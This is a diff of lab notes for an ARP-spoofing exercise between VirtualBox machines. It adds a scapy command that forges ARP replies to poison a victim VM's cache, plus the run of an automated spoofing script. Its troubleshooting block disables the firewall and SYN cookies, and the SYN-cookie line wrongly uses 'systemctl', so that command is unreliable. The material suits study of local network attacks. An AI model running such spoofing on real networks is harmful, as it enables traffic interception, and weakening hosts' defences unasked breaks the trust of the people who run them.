@@ -2,6 +2,15 @@
 # Virtual box simple arp spoof
 
 ```bash
+[miesib@victim ~]$ ip a
+[...]
+3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether 08:00:27:90:ce:e9 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.56.10/24 brd 192.168.56.255 scope global noprefixroute enp0s8
+       valid_lft forever preferred_lft forever
+    inet6 fe80::a00:27ff:fe90:cee9/64 scope link
+       valid_lft forever preferred_lft forever
+
 [miesib@victim ~]$ sudo yum install net-tools -y
 [...]
 
@@ -25,7 +34,8 @@ gateway (10.0.2.2) at 52:54:00:12:35:02 [ether] on enp0s3
 
 [miesib@mitm ~]$ sudo scapy
 [...]
->>> arp_spoof=ARP(psrc="192.168.56.12", pdst="192.168.56.10", hwsrc="08:00:27:e5:70:cd", hwdst="08:00:27:90:ce:e9", op="is-at")
+>>> arp_spoof=ARP(psrc="192.168.56.12", pdst="192.168.56.10", \
+    hwsrc="08:00:27:e5:70:cd", hwdst="08:00:27:90:ce:e9", op="is-at")
 >>> send(arp_spoof)
 .
 Sent 1 packets.
@@ -56,4 +66,26 @@ listening on enp0s8, link-type EN10MB (Ethernet), capture size 262144 bytes
 01:24:08.939550 ARP, Request who-has 192.168.56.12 tell 192.168.56.10, length 46
 01:24:09.940788 ARP, Request who-has 192.168.56.12 tell 192.168.56.10, length 46
 01:24:10.942858 ARP, Request who-has 192.168.56.12 tell 192.168.56.10, length 46
+```
+
+## Authomated attack
+
+```bash
+[miesib@mitm ~]$ sudo python3 shared/simple_arp_spoof.py
+.
+Sent 1 packets.
+.
+Sent 1 packets.
+.
+Sent 1 packets.
+.
+```
+
+# Usefull tools and troubleshooting
+
+```bash
+sudo yum install net-tools -y
+sudo yum install telnet -y
+sudo systemctl disable --now firewalld
+sudo systemctl net.ipv4.tcp_syncookies=0
 ```
